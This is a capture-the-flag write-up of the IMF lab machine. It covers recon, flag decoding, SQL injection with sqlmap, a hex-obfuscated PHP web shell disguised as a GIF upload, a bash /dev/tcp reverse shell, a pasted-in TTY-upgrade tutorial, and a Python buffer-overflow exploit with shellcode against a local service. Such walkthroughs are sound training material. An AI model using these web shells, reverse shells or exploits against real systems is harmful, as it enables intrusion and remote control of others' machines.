---
{"dg-publish":true,"permalink":"/machines/imf-writeup/","noteIcon":""}
---



# IMF

First stage, find open ports
```bash
nmap -sS -Pn -n --min-rate=5000 -p- -T5 192.168.0.106 -o reconimf.txt
```

![Pasted image 20240108115704.png](/img/user/imgs/Pasted%20image%2020240108115704.png)

>Port 80 is open
>Some users found from the page contact.php

![Pasted image 20240108115757.png|650](/img/user/imgs/Pasted%20image%2020240108115757.png)![Pasted image 20240108115810.png|650](/img/user/imgs/Pasted%20image%2020240108115810.png)


>Viewing the page source found some base64 strings.

![Pasted image 20240108120013.png](/img/user/imgs/Pasted%20image%2020240108120013.png)



*Using curl, string concatenation and base64 decode  found the following flags;

```bash
  curl http://192.168.0.106/contact.php  -o page               
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  8649    0  8649    0     0   484k      0 --:--:-- --:--:-- --:--:--  496k

┌──(root㉿kali)-[/home/kali]
└─ grep js page | tail -n 3 | cut -d / -f 2 | cut -d . -f 1 | xargs | tr -d ' ' | base64 -d
			flag2{aW1mYWRtaW5pc3RyYXRvcg==}                                                                                                              

#############################################################################################################################################

┌──(root㉿kali)-[/home/kali]
└─ cat page | grep flag1                                                                   
            <!-- flag1{YWxsdGhlZmlsZXM=} -->

┌──(root㉿kali)-[/home/kali]
└─ echo 'YWxsdGhlZmlsZXM=' | base64 -d 
allthefiles                                                                                                                                  
#############################################################################################################################################

┌──(root㉿kali)-[/home/kali]
└─ echo 'aW1mYWRtaW5pc3RyYXRvcg==' | base64 -d
imfadministrator  

```

Lets try **imfadministrator** on the browser.

![Pasted image 20240108121540.png](/img/user/imgs/Pasted%20image%2020240108121540.png)

Using **rmichaels** user from previously gathered data, 
Page is vulnerable to type juggling on the password value with **burpsuite**.

![Pasted image 20240108123851.png](/img/user/imgs/Pasted%20image%2020240108123851.png)

>Now I am admin on CMS.

CMS seems to be SQLi injectable, using sqlmap I dumped the db and the pages from the CMS. 





```bash


sqlmap -u 'http://192.168.0.106/imfadministrator/cms.php?pagename=home' --cookie PHPSESSID=0udiuae2fbv2a31i7af9hiafi3 --random-agent  -D admin -T pages -C pagename --dump --batch
```





![Pasted image 20240108144756.png](/img/user/imgs/Pasted%20image%2020240108144756.png)


![Pasted image 20240108144812.png](/img/user/imgs/Pasted%20image%2020240108144812.png)


We discovered a tutorials-incomplete page.


Found a QR

![Pasted image 20240108145127.png](/img/user/imgs/Pasted%20image%2020240108145127.png)


https://4qrcode.com/scan-qr-code.php?lang=es


 
![Pasted image 20240108145258.png](/img/user/imgs/Pasted%20image%2020240108145258.png)


```bash

┌──(kali㉿kali)-[~]
└─$ echo 'dXBsb2Fkcjk0Mi5waHA=' | base64 -d ; echo
uploadr942.php

```

Going to
http://192.168.0.106/imfadministrator/uploadr942.php

We can not upload php files nor functions on plain text ASCII to invoke a reverse shell, 

But we can inject a php cmd command execution by turning the system function into HEX.



```php
//Example code
<? php
	echo "<pre>" . shell_exec($_REQUEST['cmd']); "</pre>;"
?>
//////////////////////////////////////

<?php
  "\x73\x79\x73\x74\x65\x6d"($_GET['cmd']);
?>

//Then we make it pass for a gif file.


```

![Pasted image 20240108150531.png](/img/user/imgs/Pasted%20image%2020240108150531.png)

Once uploaded we write down the filename uploaded **aa6bdd61fa4f**
Uploaded files normally can be sanitized, in this case is within 


	no file extension

![Pasted image 20240108150601.png](/img/user/imgs/Pasted%20image%2020240108150601.png)

With file extension

![Pasted image 20240108150653.png](/img/user/imgs/Pasted%20image%2020240108150653.png)

We got RCE
lets get a reverse shell

```bash
urlenconded ampersand
##%26
&

bash -c "bash -i >& /dev/tcp/192.168.0.111/443 0>&1"
bash -c "bash -i >%26 /dev/tcp/192.168.0.111/443 0>%261"

```

![Pasted image 20240108150835.png](/img/user/imgs/Pasted%20image%2020240108150835.png)
horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
Got a reverse shell

TTY Treatment
http://192.168.0.107/blog/wp-content/plugins/wp-file-manager/lib/files/payload.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.0.111/444%200%3E%261%22

# TTY Treatment

 1 minute read

 August 27, 2021    1 minute read

![](https://invertebr4do.github.io/assets/images/tratamiento-de-tty/img_header.png)

Once we obtain a reverse shell we need to be comfortable with an interactive **TTY** to avoid problems, such as accidentally **closing the connection or simply to be able to** **move** with the arrows, to be able to use the **tab** for auto-completion of routes, etc. This is very easy to achieve, we simply have to treat the tty following these steps:

We start in the reverse shell obtained

```
$ script /dev/null -c bash
Script started, file is /dev/null
```

After this we press **ctrl_z** to suspend the shell

```
www-data@host:/$
{ #Z}

zsh: suspended  nc -nlvp 443
```

Now we will reset the shell configuration that we left in the background indicating **reset** and **xterm**

```
~$> stty raw -echo; fg
```

```
[1]  + continued  nc -nlvp 443
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

**We export the TERM** and **SHELL** environment variables

- `export TERM=xterm`-> We must do this since despite having indicated that we wanted an **xterm, at the time of restarting it, the** **TERM** environment variable is **dump** (This variable is used to be able to use keyboard shortcuts).
- `export SHELL=bash`-> So that our shell is a bash.

```
www-data@host:/$ export TERM=xterm
www-data@host:/$ export SHELL=bash
```

┌──(kali㉿kali)-[~]
└─$ echo 'YWdlbnRzZXJ2aWNlcw==' | base64 -d 
agentservices                                                                                                                                                                                                                



![Pasted image 20240108151220.png](/img/user/imgs/Pasted%20image%2020240108151220.png)

flag5


![Pasted image 20240108151305.png](/img/user/imgs/Pasted%20image%2020240108151305.png)


Port 3306 is the default port used for the MySQL protocol. 

![Pasted image 20240108151431.png](/img/user/imgs/Pasted%20image%2020240108151431.png)

mysql
ssh
7788?


```bash
www-data@imf:/var/www/html/imfadministrator/uploads$ telnet localhost 7788
Trying ::1...
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
  ___ __  __ ___ 
 |_ _|  \/  | __|  Agent
  | || |\/| | _|   Reporting
 |___|_|  |_|_|    System


Agent ID : 

```

Seems it has an unique agent,

Lets run ghidra to find where it can be exploitable. 

Checking at the main function, first there is a print function showing the IMF ascii art, then 
fgets function appears beside local_22.
>Seems like fgets() is saving the input into the local_22 variable. 


![Pasted image 20240110013450.png](/img/user/imgs/Pasted%20image%2020240110013450.png)


To make it easier to read I changed the var name for userinput.

pc= var1 is also part of the whole input process.

Here we can appreciate that the UserInput is being compared with *local_28* var.

![Pasted image 20240110013803.png](/img/user/imgs/Pasted%20image%2020240110013803.png)

Means that is making a string compare using stdin stored on userInput, with local_28 (the code we need).

Based on this code, asprintf is using the local_28 int pointer, to store on its memory the code,
Using %i you are telling the code to convert an integer value into a string
![Pasted image 20240110014046.png](/img/user/imgs/Pasted%20image%2020240110014046.png)

In summary, it allocates in memory the value of *48093572* to be further and ever compared using strncmp with the variable user_input (our input).  

The `*` symbol denotes that `local_28` is a pointer variable. 

![Pasted image 20240110022048.png](/img/user/imgs/Pasted%20image%2020240110022048.png)

Hence local_28 is a pointer variable, that stores the address of a dynamically allocated memory block, using asprintf(), that holds a string (sequence of characters) in this case (48093572).

![Pasted image 20240110022455.png](/img/user/imgs/Pasted%20image%2020240110022455.png)

After login validated, local_18 is menu, and menu is a function

![Pasted image 20240110022816.png](/img/user/imgs/Pasted%20image%2020240110022816.png)

-------
![Pasted image 20240110022824.png](/img/user/imgs/Pasted%20image%2020240110022824.png)

local_14 uses scanf to store the input written by you,
Return the number used on the menu,


![Pasted image 20240110023052.png](/img/user/imgs/Pasted%20image%2020240110023052.png)

Hence if returns; 1 then local_18 will be 1 or 2 or 3.



![Pasted image 20240110023142.png](/img/user/imgs/Pasted%20image%2020240110023142.png)

Userselection is local_18
3 Different options.
Number three leads to the report function.

![Pasted image 20240110023237.png](/img/user/imgs/Pasted%20image%2020240110023237.png)

This report function is using gets.

Gets does not validate the total allocated buffer size from the string received.
It is a vulnerable function, it will lead to segmentation fault, buffer overflow. 

fgets() normally stores the variable values using a declared buffer.
![Pasted image 20240110023732.png](/img/user/imgs/Pasted%20image%2020240110023732.png)
Here it is given a 9 character buffer, for the user input.

But on get does not happen 
the same.

![Pasted image 20240110023939.png](/img/user/imgs/Pasted%20image%2020240110023939.png)

Here it is declared for 56, but fgets sanitizes and allows just 55 chars.
![Pasted image 20240110024016.png](/img/user/imgs/Pasted%20image%2020240110024016.png)
written in HEX

![Pasted image 20240110024045.png](/img/user/imgs/Pasted%20image%2020240110024045.png)


![Pasted image 20240110024059.png](/img/user/imgs/Pasted%20image%2020240110024059.png)

168 is the offset.

![Pasted image 20240110024113.png](/img/user/imgs/Pasted%20image%2020240110024113.png)


![Pasted image 20240110024200.png](/img/user/imgs/Pasted%20image%2020240110024200.png)

no sec

![Pasted image 20240110024231.png](/img/user/imgs/Pasted%20image%2020240110024231.png)

randomize on

![Pasted image 20240110024244.png](/img/user/imgs/Pasted%20image%2020240110024244.png)

Memory addresses can change, in case u create a collision 
![Pasted image 20240110024311.png](/img/user/imgs/Pasted%20image%2020240110024311.png)


![Pasted image 20240110024356.png](/img/user/imgs/Pasted%20image%2020240110024356.png)


x/16w list 16 words on memory written.

![Pasted image 20240110024441.png](/img/user/imgs/Pasted%20image%2020240110024441.png)

to go backwards

![Pasted image 20240110024507.png](/img/user/imgs/Pasted%20image%2020240110024507.png)

EAX contains on its memory stack the pointer address to position and read the input string given.

We can ret2reg (Return To Registry ) using a call to eax function to point to  EAX registry when running the code and consequently it will read the shellcode as it containts on its own registry the pointers and mem stack addresses of the input given. 

EAX contains the beginning of all the memory addresses to parse from the input given. 

Hence it will interpret whatever is reading. 

![Pasted image 20240110025520.png](/img/user/imgs/Pasted%20image%2020240110025520.png)

Hence EAX knows the mem address to parse and interpret the whole input (payload).

```python
#!/usr/bin/python3

import socket
from struct import pack

shellcode= (b"\x31\xc9\x83\xe9\xef\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76"
b"\x0e\x4f\x94\xbc\x4e\x83\xee\xfc\xe2\xf4\x7e\x4f\x4b\xad"
b"\x1c\xd7\xef\x24\x4d\x1d\x5d\xfe\x29\x59\x3c\xdd\x16\x24"
b"\x83\x83\xcf\xdd\xc5\xb7\x27\x54\x14\x4e\x20\xfc\xbe\x4e"
b"\x4d\x0e\x35\xaf\xff\xf2\xec\x1f\x1c\x27\xbf\xc7\xae\x59"
b"\x3c\x1c\x27\xfa\x93\x3d\x27\xfc\x93\x61\x2d\xfd\x35\xad"
b"\x1d\xc7\x35\xaf\xff\x9f\x71\xce")

offset = 168
ip = "192.168.0.105"
port = 7788

payload = shellcode + b"A" * (offset - len(shellcode)) + pack("<I", 0x08048563) + b"\n"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
##recibir la respuesta del servicio,primeros 1024 bytes
s.send(b"48093572\n")
s.recv(1024)
s.send(b"3\n")
s.recv(1025)
s.send(payload)


```


![Pasted image 20240110053038.png](/img/user/imgs/Pasted%20image%2020240110053038.png)

